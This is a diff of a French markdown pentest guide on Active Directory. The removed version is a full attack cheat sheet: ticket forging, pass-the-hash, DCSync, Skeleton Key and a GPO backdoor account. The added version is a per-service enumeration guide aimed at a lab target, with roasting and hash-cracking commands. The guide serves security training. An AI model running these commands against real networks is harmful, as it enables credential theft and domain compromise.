@@ -1,585 +1,449 @@
-# 🏢 Active Directory Attacks - Guide Complet
+# 🏴‍☠️ Active Directory - Guide d'Énumération par Service
 
-Guide exhaustif pour l'énumération et l'exploitation des environnements Active Directory.
-
----
-
-## 📖 Concepts de Base
-
-### Architecture AD
-
-```
-Forest          → Ensemble de domaines avec relation de confiance
-Domain          → Unité administrative (ex: corp.local)
-Domain Controller (DC) → Serveur hébergeant AD
-Organizational Unit (OU) → Container pour organiser les objets
-Group Policy (GPO) → Politiques appliquées aux objets
-```
-
-### Protocoles clés
-
-```
-LDAP    (389/636)   → Requêtes annuaire
-Kerberos (88)       → Authentification
-SMB     (445)       → Partages fichiers
-RPC     (135)       → Remote Procedure Call
-WinRM   (5985/5986) → Remote Management
-```
+> Guide pédagogique : comprendre chaque service AD, pourquoi il existe, et comment l'énumérer.
 
 ---
 
-## 1️⃣ Énumération Initiale
+## ⚙️ Prérequis - Avant de commencer
 
-### Sans credentials
+### 1. Synchroniser l'heure (CRITIQUE pour Kerberos)
 
-```bash
-# Énumérer le domaine
-nmap -p 389,636,88,445 -sV 10.10.10.0/24
-
-# LDAP anonymous bind
-ldapsearch -x -H ldap://DC_IP -b "DC=corp,DC=local"
-
-# RPC null session
-rpcclient -U "" -N DC_IP
-> enumdomusers
-> enumdomgroups
-> querydominfo
-
-# SMB null session
-smbclient -L //DC_IP -N
-crackmapexec smb DC_IP -u '' -p '' --shares
-enum4linux -a DC_IP
-
-# Kerbrute - énumérer les utilisateurs
-kerbrute userenum -d corp.local --dc DC_IP userlist.txt
-```
-
-### Avec credentials
+Kerberos refuse les tickets avec plus de **5 minutes** de décalage. C'est une protection anti-rejeu intégrée au protocole.
 
 ```bash
-# LDAP
-ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w 'password' -b "DC=corp,DC=local"
+# Vérifier le décalage (visible dans le scan nmap avec clock-skew)
+sudo ntpdate <DC_IP>
 
-# Énumérer tout avec ldapdomaindump
-ldapdomaindump -u 'corp.local\user' -p 'password' DC_IP
+# Alternative manuelle
+sudo timedatectl set-ntp false
+sudo date -s "$(curl -sI http://<DC_IP> | grep -i date | cut -d' ' -f2-)"
 
-# CrackMapExec
-crackmapexec smb DC_IP -u user -p password --users
-crackmapexec smb DC_IP -u user -p password --groups
-crackmapexec smb DC_IP -u user -p password --shares
-
-# RPCClient
-rpcclient -U "user%password" DC_IP
-> enumdomusers
-> querygroupmem 512  # Domain Admins
-
-# Énumération PowerShell (depuis Windows)
-Get-ADUser -Filter * -Properties *
-Get-ADGroup -Filter * | Select Name
-Get-ADComputer -Filter * -Properties *
+# Vérifier que c'est bon
+date && curl -sI http://<DC_IP> | grep -i date
 ```
 
-### BloodHound
-
-```bash
-# Collecte avec SharpHound (Windows)
-.\SharpHound.exe -c All
-.\SharpHound.exe -c All --domain corp.local --ldapuser user --ldappass password
-
-# Collecte avec bloodhound-python (Linux)
-bloodhound-python -u user -p password -d corp.local -ns DC_IP -c All
-
-# Importer dans BloodHound
-# 1. Démarrer neo4j: neo4j console
-# 2. Démarrer BloodHound
-# 3. Importer les fichiers JSON/ZIP
-
-# Requêtes utiles dans BloodHound
-# - Shortest path to Domain Admins
-# - Find all Kerberoastable users
-# - Find computers with unsupported OS
-# - Find principals with DCSync rights
-```
+> **Pourquoi ?** Le serveur DC maintient une horloge de référence. Tous les clients AD doivent être synchronisés. Un attaquant qui rejoue un ticket capturé serait bloqué s'il essaie trop tard.
 
 ---
 
-## 2️⃣ Kerberos Attacks
-
-### AS-REP Roasting
-
-**Principe** : Utilisateurs sans pré-authentification Kerberos → Hash récupérable.
+### 2. Configurer /etc/hosts
 
 ```bash
-# Identifier les comptes vulnérables
-Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}  # PowerShell
-ldapsearch -x -H ldap://DC_IP -D "user@corp.local" -w 'pass' -b "DC=corp,DC=local" "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
-
-# Extraire les hashes
-# Avec Impacket
-GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat
-
-# Avec Rubeus (Windows)
-.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
-
-# Cracker
-hashcat -m 18200 asrep.txt wordlist.txt
-john --wordlist=wordlist.txt asrep.txt
+echo "<DC_IP> <DOMAIN> DC01.<DOMAIN>" | sudo tee -a /etc/hosts
+# Exemple :
+echo "10.129.7.111 pirate.htb DC01.pirate.htb" | sudo tee -a /etc/hosts
 ```
 
-### Kerberoasting
+> **Pourquoi ?** Les outils AD utilisent des noms DNS, pas des IPs. Kerberos en particulier est très sensible aux noms exacts.
 
-**Principe** : Services avec SPN → Ticket TGS contenant hash du service.
+---
+
+## 🔵 Port 53 - DNS
+
+### Rôle dans Active Directory
+
+Dans AD, le DNS n'est pas optionnel — c'est le pilier de toute l'infrastructure. Le DC est **aussi** serveur DNS. C'est par DNS que les machines trouvent le DC, que Kerberos résout les SPNs, que les clients rejoignent le domaine.
+
+### Ce qu'on peut y trouver
+
+- Noms de machines internes (serveurs, postes de travail)
+- Sous-domaines
+- Enregistrements SRV qui révèlent la structure AD
+
+### Énumération
 
 ```bash
-# Identifier les comptes avec SPN
-setspn -Q */*  # Windows
-GetUserSPNs.py corp.local/user:password -dc-ip DC_IP  # Impacket
+# Requêtes basiques
+nslookup <DOMAIN> <DC_IP>
+nslookup -type=SRV _ldap._tcp.dc._msdcs.<DOMAIN> <DC_IP>
+nslookup -type=SRV _kerberos._tcp.<DOMAIN> <DC_IP>
 
-# Extraire les tickets
-# Avec Impacket
-GetUserSPNs.py corp.local/user:password -dc-ip DC_IP -request -outputfile kerberoast.txt
+# Transfert de zone (souvent bloqué mais vaut le coup d'essayer)
+dig axfr <DOMAIN> @<DC_IP>
+host -l <DOMAIN> <DC_IP>
 
-# Avec Rubeus (Windows)
-.\Rubeus.exe kerberoast /outfile:kerberoast.txt
+# Énumération agressive avec dnsenum
+dnsenum --dnsserver <DC_IP> --enum -p 0 -s 0 <DOMAIN>
 
-# Avec PowerView
-Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash
-
-# Cracker
-hashcat -m 13100 kerberoast.txt wordlist.txt
-john --wordlist=wordlist.txt kerberoast.txt
+# Bruteforce de sous-domaines
+gobuster dns -d <DOMAIN> -r <DC_IP> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 ```
 
-### Silver Ticket
+### Ce qu'on cherche
 
-**Principe** : Forger un TGS avec le hash du compte de service.
+- Des noms de machines qui révèlent leur rôle (ex: `sql.pirate.htb`, `web.pirate.htb`, `dev.pirate.htb`)
+- Des enregistrements inhabituels
+- La structure interne du réseau
+
+---
+
+## 🔵 Port 80/443 - HTTP/HTTPS (IIS)
+
+### Rôle dans Active Directory
+
+Un serveur web sur un DC est **inhabituel** et donc **intéressant**. Ce peut être :
+- Une application interne (portail RH, ticketing, etc.)
+- Un service AD comme ADCS (Active Directory Certificate Services) — accessible sur `/certsrv`
+- Un site de test laissé par des admins
+
+### Énumération
 
 ```bash
-# Prérequis: hash NTLM du compte de service
+# Découverte de contenu
+gobuster dir -u http://<DC_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,asp,aspx,html,txt
 
-# Avec Impacket
-ticketer.py -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain corp.local -spn MSSQLSvc/sql.corp.local:1433 administrator
+# Vérifier ADCS (très important !)
+curl -s http://<DC_IP>/certsrv/
+# Si ça répond → Active Directory Certificate Services présent → vulnérabilités ESC1-ESC8
 
-# Avec Mimikatz
-kerberos::golden /domain:corp.local /sid:S-1-5-21-... /target:sql.corp.local /service:MSSQLSvc /rc4:<HASH> /user:administrator /ptt
+# Vérifier les méthodes HTTP risquées (ton scan montre TRACE activé)
+curl -X TRACE http://<DC_IP>
 
-# Utiliser le ticket
-export KRB5CCNAME=administrator.ccache
-mssqlclient.py -k sql.corp.local
+# Exploration manuelle HTTPS
+curl -sk https://<DC_IP>/ -o /dev/null -w "%{http_code}"
 ```
 
-### Golden Ticket
+### ADCS - Pourquoi c'est critique
 
-**Principe** : Forger un TGT avec le hash du compte krbtgt.
+Si `/certsrv` répond, c'est potentiellement l'une des vulnérabilités les plus puissantes d'AD actuellement (ESC1 à ESC13). On peut parfois obtenir un certificat qui permet de s'authentifier en tant qu'administrateur.
 
 ```bash
-# Prérequis: hash NTLM du compte krbtgt (nécessite compromission DC)
-
-# Avec Impacket
-ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.local administrator
-
-# Avec Mimikatz
-kerberos::golden /domain:corp.local /sid:S-1-5-21-... /krbtgt:<HASH> /user:administrator /ptt
-
-# Utiliser le ticket
-export KRB5CCNAME=administrator.ccache
-psexec.py -k -no-pass corp.local/administrator@DC_IP
+# Vérifier si ADCS est présent et énumérer les templates
+certipy find -u user@<DOMAIN> -p password -dc-ip <DC_IP>
 ```
 
 ---
 
-## 3️⃣ Credential Attacks
+## 🔵 Port 88 - Kerberos
 
-### Password Spraying
+### Rôle dans Active Directory
+
+Kerberos est le **protocole d'authentification principal** d'AD depuis Windows 2000. Il remplace NTLM (plus ancien et moins sécurisé). Son fonctionnement :
+
+1. Le client demande un **TGT** (Ticket Granting Ticket) au DC avec ses credentials
+2. Avec ce TGT, il demande des **TGS** (Service Tickets) pour accéder aux services
+3. Les tickets sont chiffrés avec les hash des comptes concernés
+
+### Ce qu'on peut faire SANS credentials
 
 ```bash
-# Avec CrackMapExec
-crackmapexec smb DC_IP -u users.txt -p 'Summer2024!' --continue-on-success
+# Énumérer les utilisateurs valides (Kerberos répond différemment si user existe)
+kerbrute userenum -d <DOMAIN> --dc <DC_IP> /usr/share/wordlists/SecLists/Usernames/Names/names.txt
 
-# Avec Kerbrute (plus discret)
-kerbrute passwordspray -d corp.local --dc DC_IP users.txt 'Summer2024!'
-
-# Avec Spray (Windows)
-Spray-Passwords.ps1 -Pass 'Summer2024!' -Admin
-
-# Règles communes de mots de passe
-Season+Year: Summer2024, Winter2023
-Company+123: Corp123!, Company1!
-Welcome+1: Welcome1, Welcome123
+# AS-REP Roasting sans credentials
+# Certains comptes n'ont pas besoin de pré-authentification → on peut récupérer leur hash
+GetNPUsers.py <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -no-pass
 ```
 
-### Pass-the-Hash (PtH)
+### Ce qu'on peut faire AVEC credentials
 
 ```bash
-# Avec Impacket
-psexec.py -hashes :NTLM_HASH corp.local/administrator@TARGET
-wmiexec.py -hashes :NTLM_HASH corp.local/administrator@TARGET
-smbexec.py -hashes :NTLM_HASH corp.local/administrator@TARGET
+# Kerberoasting : récupérer les hash des comptes de service (SPN)
+GetUserSPNs.py <DOMAIN>/user:password -dc-ip <DC_IP> -request -outputfile kerberoast.txt
 
-# Avec CrackMapExec
-crackmapexec smb TARGET -u administrator -H NTLM_HASH
-crackmapexec smb TARGET -u administrator -H NTLM_HASH -x "whoami"
-
-# Avec evil-winrm
-evil-winrm -i TARGET -u administrator -H NTLM_HASH
-
-# Avec Mimikatz (Windows)
-sekurlsa::pth /user:administrator /domain:corp.local /ntlm:HASH /run:cmd
+# Cracker les hash
+hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt  # Pour AS-REP
 ```
 
-### Pass-the-Ticket (PtT)
+### Pourquoi Kerberos est attaquable
+
+Les tickets TGS sont **chiffrés avec le hash NTLM du compte de service**. Si ce hash correspond à un mot de passe faible, on peut le cracker hors ligne, sans bruit sur le réseau.
+
+---
+
+## 🔵 Port 135 - RPC (Remote Procedure Call)
+
+### Rôle dans Active Directory
+
+RPC est le mécanisme de communication entre processus Windows à distance. Il sert de base à beaucoup d'autres services : gestion des utilisateurs, GPO, WMI, impression...
+
+### Énumération
 
 ```bash
-# Exporter les tickets (Mimikatz)
-sekurlsa::tickets /export
+# Session nulle (sans credentials)
+rpcclient -U "" -N <DC_IP>
 
-# Importer un ticket
-kerberos::ptt ticket.kirbi
+# Commandes utiles dans rpcclient
+> enumdomusers          # Liste tous les utilisateurs
+> enumdomgroups         # Liste tous les groupes
+> querydominfo          # Infos générales sur le domaine
+> querygroupmem 512     # Membres du groupe Domain Admins (RID 512)
+> queryuser 0x3e8       # Infos sur un utilisateur par RID
+> enumprivs            # Privilèges
 
-# Avec Rubeus
-.\Rubeus.exe ptt /ticket:base64_ticket
-
-# Linux avec Impacket
-export KRB5CCNAME=/path/to/ticket.ccache
-psexec.py -k -no-pass corp.local/user@TARGET
+# Avec credentials
+rpcclient -U "user%password" <DC_IP>
 ```
 
-### Overpass-the-Hash
+### Ce qu'on cherche
+
+- La liste complète des utilisateurs (pour du password spraying ensuite)
+- Les membres des groupes à hauts privilèges
+- Des informations sur la politique de mots de passe (longueur min, lockout)
+
+---
+
+## 🔵 Port 139/445 - SMB (Server Message Block)
+
+### Rôle dans Active Directory
+
+SMB gère le partage de fichiers et d'imprimantes sous Windows. Dans AD, il transporte aussi les **GPO** (politiques de groupe), les **scripts de login**, et permet l'exécution à distance (PSExec, WMI).
+
+### Énumération sans credentials
 
 ```bash
-# Convertir hash NTLM en ticket Kerberos
+# Lister les partages
+smbclient -L //<DC_IP> -N
+crackmapexec smb <DC_IP> -u '' -p '' --shares
 
-# Avec Rubeus
-.\Rubeus.exe asktgt /user:administrator /rc4:NTLM_HASH /ptt
+# Enum4linux (tout en un)
+enum4linux -a <DC_IP>
 
-# Avec Impacket
-getTGT.py corp.local/administrator -hashes :NTLM_HASH
-export KRB5CCNAME=administrator.ccache
+# Nmap scripts SMB
+nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery -p 445 <DC_IP>
+```
+
+### Énumération avec credentials
+
+```bash
+# Partages et permissions
+crackmapexec smb <DC_IP> -u user -p password --shares
+crackmapexec smb <DC_IP> -u user -p password --users
+crackmapexec smb <DC_IP> -u user -p password --groups
+crackmapexec smb <DC_IP> -u user -p password --sessions
+crackmapexec smb <DC_IP> -u user -p password --loggedon-users
+
+# Accéder à un partage
+smbclient //<DC_IP>/SYSVOL -U "user%password"
+smbclient //<DC_IP>/NETLOGON -U "user%password"
+
+# Chercher des fichiers intéressants (passwords, configs)
+smbmap -H <DC_IP> -u user -p password -R
+```
+
+### Partages critiques à explorer
+
+| Partage | Contenu | Pourquoi c'est intéressant |
+|---------|---------|---------------------------|
+| `SYSVOL` | GPO, scripts | Peut contenir des mots de passe en clair dans les GPO (cpassword) |
+| `NETLOGON` | Scripts de login | Scripts avec parfois des credentials |
+| `C$` | Disque C: | Accès admin complet si droit |
+| `ADMIN$` | Dossier Windows | Utilisé par PSExec |
+
+```bash
+# Chercher cpassword dans SYSVOL (mot de passe GPO chiffré mais déchiffrable)
+crackmapexec smb <DC_IP> -u user -p password -M gpp_password
 ```
 
 ---
 
-## 4️⃣ Delegation Attacks
+## 🔵 Port 389/636 - LDAP/LDAPS
 
-### Unconstrained Delegation
+### Rôle dans Active Directory
+
+LDAP (Lightweight Directory Access Protocol) est **l'interface principale d'AD**. Tout ce qui est dans AD (utilisateurs, groupes, ordinateurs, GPO, permissions) est accessible via LDAP. Le port 636 est la version chiffrée (SSL).
+
+### Énumération sans credentials
 
 ```bash
-# Identifier les machines avec unconstrained delegation
-Get-ADComputer -Filter {TrustedForDelegation -eq $true}  # PowerShell
-ldapsearch ... "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
+# Tentative de bind anonyme
+ldapsearch -x -H ldap://<DC_IP> -b "DC=<DOMAIN>,DC=<TLD>"
+# Exemple : ldapsearch -x -H ldap://10.129.7.111 -b "DC=pirate,DC=htb"
 
-# Exploitation: capturer les TGT des utilisateurs qui se connectent
-
-# Avec Rubeus - monitor les nouveaux tickets
-.\Rubeus.exe monitor /interval:5
-
-# Forcer une connexion (PrinterBug)
-SpoolSample.exe DC_IP ATTACK_IP
-# ou
-printerbug.py corp.local/user:password@DC_IP ATTACK_IP
-
-# Capturer et utiliser le ticket
-.\Rubeus.exe ptt /ticket:base64_ticket
+# Infos de base toujours accessibles (rootDSE)
+ldapsearch -x -H ldap://<DC_IP> -s base
 ```
 
-### Constrained Delegation
+### Énumération avec credentials
 
 ```bash
-# Identifier
-Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
-Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+# Dump complet de l'AD
+ldapdomaindump -u '<DOMAIN>\user' -p 'password' <DC_IP> -o ./ldap_dump/
 
-# Exploitation avec S4U
-# Avec Rubeus
-.\Rubeus.exe s4u /user:service_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target.corp.local /ptt
+# Requêtes ciblées
+# Tous les utilisateurs
+ldapsearch -x -H ldap://<DC_IP> -D "user@<DOMAIN>" -w 'password' -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=user)" sAMAccountName
 
-# Avec Impacket
-getST.py -spn cifs/target.corp.local -impersonate administrator corp.local/service_account -hashes :HASH
-export KRB5CCNAME=administrator.ccache
-psexec.py -k -no-pass target.corp.local
+# Utilisateurs sans pré-auth Kerberos (AS-REP Roasting)
+ldapsearch -x -H ldap://<DC_IP> -D "user@<DOMAIN>" -w 'password' -b "DC=<DOMAIN>,DC=<TLD>" "(&(userAccountControl:1.2.840.113556.1.4.803:=4194304))"
+
+# Comptes avec SPN (Kerberoasting)
+ldapsearch -x -H ldap://<DC_IP> -D "user@<DOMAIN>" -w 'password' -b "DC=<DOMAIN>,DC=<TLD>" "(&(servicePrincipalName=*)(objectClass=user))"
+
+# Comptes avec delegation
+ldapsearch -x -H ldap://<DC_IP> -D "user@<DOMAIN>" -w 'password' -b "DC=<DOMAIN>,DC=<TLD>" "(userAccountControl:1.2.840.113556.1.4.803:=524288)"
 ```
 
-### Resource-Based Constrained Delegation (RBCD)
+### Ce qu'on cherche dans un dump LDAP
+
+- **Utilisateurs** : noms, descriptions (parfois des mots de passe en clair !), groupes
+- **Attributs spéciaux** : `adminCount=1` (comptes protégés), `userAccountControl` (flags du compte)
+- **Comptes de service** : souvent avec des mots de passe faibles
+- **Descriptions** : les admins mettent parfois des mots de passe dans les champs description
 
 ```bash
-# Prérequis: contrôle d'un compte avec SPN (ou machine account)
-# + Write permission sur un ordinateur cible
-
-# Ajouter la délégation
-Set-ADComputer target$ -PrincipalsAllowedToDelegateToAccount attacker$
-
-# Avec Impacket
-rbcd.py -delegate-from 'attacker$' -delegate-to 'target$' -dc-ip DC_IP -action 'write' 'corp.local/user:password'
-
-# Obtenir un ticket
-getST.py -spn cifs/target.corp.local -impersonate administrator corp.local/attacker$ -hashes :HASH
+# Chercher des mots de passe dans les descriptions
+ldapsearch -x -H ldap://<DC_IP> -D "user@<DOMAIN>" -w 'password' -b "DC=<DOMAIN>,DC=<TLD>" "(objectClass=user)" sAMAccountName description | grep -i "pass\|pwd\|password"
 ```
 
 ---
 
-## 5️⃣ ACL Attacks
+## 🔵 Port 464 - Kpasswd
 
-### GenericAll / GenericWrite
+### Rôle dans Active Directory
 
-```bash
-# Sur un utilisateur → reset password
-net user targetuser NewPass123! /domain
+Ce port gère uniquement le **changement de mot de passe Kerberos**. Il est utilisé quand un compte doit changer son password via le protocole Kerberos.
 
-# Avec PowerView
-Set-DomainUserPassword -Identity targetuser -AccountPassword (ConvertTo-SecureString 'NewPass!' -AsPlainText -Force)
+### Utilisation en pentest
 
-# Sur un groupe → s'ajouter
-Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
-
-# Sur un ordinateur → RBCD
-```
-
-### WriteDACL
+Peu utilisé directement en attaque. Il peut être utile après avoir obtenu un TGT pour un compte dont le mot de passe a expiré.
 
 ```bash
-# Ajouter des permissions
-# Avec PowerView
-Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All
-
-# Avec Impacket
-dacledit.py -action 'write' -rights 'FullControl' -principal 'attacker' -target 'targetuser' corp.local/user:password
-```
-
-### DCSync
-
-```bash
-# Vérifier les droits DCSync
-Get-DomainObjectAcl -Identity "DC=corp,DC=local" | ? {($_.ObjectType -eq "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2") -or ($_.ObjectType -eq "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2")}
-
-# Exploitation avec Mimikatz
-lsadump::dcsync /domain:corp.local /user:administrator
-lsadump::dcsync /domain:corp.local /user:krbtgt
-
-# Avec Impacket
-secretsdump.py corp.local/user:password@DC_IP
-secretsdump.py -hashes :HASH corp.local/admin@DC_IP
-
-# Dump tout
-secretsdump.py corp.local/admin:password@DC_IP -just-dc
+# Changer un mot de passe via Kerberos
+kpasswd user@<DOMAIN>
 ```
 
 ---
 
-## 6️⃣ Lateral Movement
+## 🔵 Port 593 - RPC over HTTP
 
-### PSExec
+### Rôle dans Active Directory
 
-```bash
-# Impacket
-psexec.py corp.local/admin:password@TARGET
-psexec.py -hashes :HASH corp.local/admin@TARGET
+Permet d'encapsuler RPC dans HTTP. Utilisé principalement par **Outlook** pour se connecter à Exchange, et par les clients qui doivent accéder au DC depuis Internet (à travers des proxies).
 
-# Metasploit
-use exploit/windows/smb/psexec
-```
-
-### WMI
+### Utilisation en pentest
 
 ```bash
-# Impacket
-wmiexec.py corp.local/admin:password@TARGET
-
-# PowerShell
-Invoke-WmiMethod -ComputerName TARGET -Credential $cred -Class Win32_Process -Name Create -ArgumentList "powershell -e BASE64"
-```
-
-### WinRM
-
-```bash
-# Evil-WinRM
-evil-winrm -i TARGET -u admin -p password
-evil-winrm -i TARGET -u admin -H NTLM_HASH
-
-# PowerShell
-Enter-PSSession -ComputerName TARGET -Credential $cred
-Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock {whoami}
-```
-
-### SMB
-
-```bash
-# Impacket
-smbexec.py corp.local/admin:password@TARGET
-atexec.py corp.local/admin:password@TARGET "whoami"
-
-# CrackMapExec
-crackmapexec smb TARGET -u admin -p password -x "whoami"
-```
-
-### DCOM
-
-```bash
-# Impacket
-dcomexec.py corp.local/admin:password@TARGET
-
-# PowerShell (MMC20)
-$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"))
-$com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
+# Impacket supporte RPC over HTTP
+# Certains outils peuvent l'utiliser pour traverser des firewalls
+rpcdump.py <DC_IP>
 ```
 
 ---
 
-## 7️⃣ Persistence
+## 🔵 Port 3268/3269 - Global Catalog LDAP
 
-### Skeleton Key
+### Rôle dans Active Directory
 
-```bash
-# Injecter dans LSASS (mot de passe universel: mimikatz)
-mimikatz # privilege::debug
-mimikatz # misc::skeleton
+Le **Global Catalog** est une version partielle de l'annuaire qui contient des objets de **tous les domaines** d'une forêt AD (pas seulement le domaine local). C'est crucial dans les environnements multi-domaines.
 
-# Se connecter avec n'importe quel user
-psexec.py corp.local/anyuser:mimikatz@DC_IP
-```
+- Port 3268 : Global Catalog LDAP
+- Port 3269 : Global Catalog LDAPS (chiffré)
 
-### AdminSDHolder
+### Différence avec LDAP standard (389)
 
-```bash
-# Ajouter un utilisateur à AdminSDHolder (propagé aux groupes protégés)
-Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -PrincipalIdentity attacker -Rights All
+| LDAP 389 | Global Catalog 3268 |
+|----------|---------------------|
+| Domaine local uniquement | Toute la forêt |
+| Tous les attributs | Attributs partiels |
+| Recherche locale | Recherche inter-domaines |
 
-# Attendre 60 minutes (ou forcer)
-Invoke-SDPropagator -Force
-```
-
-### Group Policy
+### Énumération
 
 ```bash
-# Créer une GPO malveillante
-# - Scheduled Task
-# - Startup script
-# - Registry persistence
+# Même syntaxe que LDAP mais sur port 3268
+ldapsearch -x -H ldap://<DC_IP>:3268 -D "user@<DOMAIN>" -w 'password' -b "DC=<DOMAIN>,DC=<TLD>"
 
-# SharpGPOAbuse
-.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author administrator --Command "cmd.exe" --Arguments "/c net user backdoor P@ss123 /add" --GPOName "Default Domain Policy"
+# Utile pour découvrir d'autres domaines dans la forêt
+ldapsearch -x -H ldap://<DC_IP>:3268 -D "user@<DOMAIN>" -w 'password' -b "" -s base "(objectClass=*)" namingContexts
 ```
 
 ---
 
-## 8️⃣ Outils Essentiels
+## 🔵 Port 5985/5986 - WinRM
 
-### Impacket
+### Rôle dans Active Directory
+
+WinRM (Windows Remote Management) permet la **gestion à distance** des machines Windows via PowerShell Remoting. C'est l'équivalent Windows de SSH.
+
+- Port 5985 : HTTP (non chiffré)
+- Port 5986 : HTTPS (chiffré)
+
+### Accès avec credentials
 
 ```bash
-# Installation
-pip install impacket
-# ou
-git clone https://github.com/fortra/impacket
-cd impacket && pip install .
+# Evil-WinRM (le meilleur outil pour ça)
+evil-winrm -i <TARGET_IP> -u user -p password
+evil-winrm -i <TARGET_IP> -u user -H <NTLM_HASH>  # Pass-the-Hash
 
-# Outils principaux
-GetNPUsers.py      # AS-REP Roasting
-GetUserSPNs.py     # Kerberoasting
-secretsdump.py     # Dump credentials
-psexec.py          # Remote execution
-wmiexec.py         # WMI execution
-smbclient.py       # SMB client
-getTGT.py          # Get TGT
-getST.py           # Get Service Ticket
-ticketer.py        # Forge tickets
+# Vérifier si WinRM est accessible
+crackmapexec winrm <TARGET_IP> -u user -p password
 ```
 
-### Mimikatz
+### Ce qu'on peut faire une fois connecté
 
-```bash
-# Commandes principales
-privilege::debug
-sekurlsa::logonpasswords    # Dump passwords
-sekurlsa::tickets /export   # Export tickets
-lsadump::dcsync            # DCSync
-lsadump::sam               # Dump SAM
-kerberos::golden           # Golden ticket
-kerberos::ptt              # Pass-the-ticket
-```
-
-### CrackMapExec
-
-```bash
-# Enumération
-crackmapexec smb TARGET -u user -p pass --users
-crackmapexec smb TARGET -u user -p pass --shares
-crackmapexec smb TARGET -u user -p pass --sessions
-crackmapexec smb TARGET -u user -p pass --loggedon-users
-
-# Exécution
-crackmapexec smb TARGET -u user -p pass -x "whoami"
-crackmapexec smb TARGET -u user -p pass -X "Invoke-Mimikatz"
-
-# Dump
-crackmapexec smb TARGET -u admin -p pass --sam
-crackmapexec smb TARGET -u admin -p pass --lsa
-crackmapexec smb TARGET -u admin -p pass --ntds
-```
-
-### Rubeus
-
-```bash
-# Kerberoasting
-.\Rubeus.exe kerberoast
-
-# AS-REP Roasting  
-.\Rubeus.exe asreproast
-
-# Request TGT
-.\Rubeus.exe asktgt /user:user /password:pass
-
-# Pass-the-ticket
-.\Rubeus.exe ptt /ticket:base64
-
-# Monitor tickets
-.\Rubeus.exe monitor /interval:5
+```powershell
+# Depuis la session evil-winrm
+whoami /all                    # Voir tous les privilèges
+net user                       # Utilisateurs locaux
+net localgroup administrators  # Admins locaux
 ```
 
 ---
 
-## 9️⃣ Cheatsheet Rapide
+## 🔵 Port 2179 - vmrdp (Hyper-V)
 
-```bash
-# Énumération
-bloodhound-python -u user -p pass -d corp.local -ns DC_IP -c All
-crackmapexec smb DC_IP -u user -p pass --users
+### Rôle dans Active Directory
 
-# AS-REP Roasting
-GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC_IP
+Ce port est lié à **Hyper-V Virtual Machine Bus** (VMBus) ou parfois à du RDP Hyper-V. Sa présence indique que le DC exécute peut-être des machines virtuelles, ce qui suggère que c'est un hôte Hyper-V.
 
-# Kerberoasting
-GetUserSPNs.py corp.local/user:pass -dc-ip DC_IP -request
+### Ce que ça implique
 
-# Password Spray
-crackmapexec smb DC_IP -u users.txt -p 'Summer2024!'
+- Le serveur est probablement plus puissant que la moyenne
+- Des VMs tournent potentiellement sur ce DC
+- Peut révéler d'autres systèmes à attaquer
 
-# Pass-the-Hash
-psexec.py -hashes :HASH corp.local/admin@TARGET
-crackmapexec smb TARGET -u admin -H HASH -x "whoami"
+---
 
-# DCSync
-secretsdump.py corp.local/admin:pass@DC_IP
+## 🔀 Workflow Complet - Par où commencer
 
-# Golden Ticket
-ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain corp.local administrator
-
-# Lateral Movement
-psexec.py corp.local/admin:pass@TARGET
-evil-winrm -i TARGET -u admin -p pass
-wmiexec.py corp.local/admin:pass@TARGET
 ```
+1. SANS CREDENTIALS
+   ├── DNS (53)       → Cartographier les machines
+   ├── SMB (445)      → Session nulle, partages accessibles
+   ├── LDAP (389)     → Bind anonyme (rare mais possible)
+   ├── RPC (135)      → rpcclient null session
+   ├── Kerberos (88)  → Énumérer les users valides (kerbrute)
+   └── HTTP (80/443)  → Explorer le site, chercher /certsrv
+
+2. AVEC UN PREMIER COMPTE
+   ├── BloodHound     → Cartographie complète des chemins d'attaque
+   ├── LDAP dump      → ldapdomaindump, chercher descriptions/passwords
+   ├── SMB            → Parcourir SYSVOL, chercher GPP passwords
+   ├── Kerberoasting  → GetUserSPNs.py → cracker hors ligne
+   └── AS-REP         → GetNPUsers.py
+
+3. ÉLÉVATION DE PRIVILÈGES
+   ├── ACL attacks    → BloodHound révèle les chemins
+   ├── Delegation     → Unconstrained/Constrained/RBCD
+   ├── DCSync         → Si droits suffisants
+   └── ADCS (ESC*)    → Si /certsrv accessible
+```
+
+---
+
+## 🛠️ Outils par service
+
+| Service | Outils principaux |
+|---------|------------------|
+| DNS | `dig`, `dnsenum`, `gobuster dns` |
+| HTTP | `gobuster dir`, `feroxbuster`, `nikto`, `certipy` |
+| Kerberos | `kerbrute`, `GetNPUsers.py`, `GetUserSPNs.py`, `Rubeus` |
+| RPC | `rpcclient`, `impacket-rpcdump` |
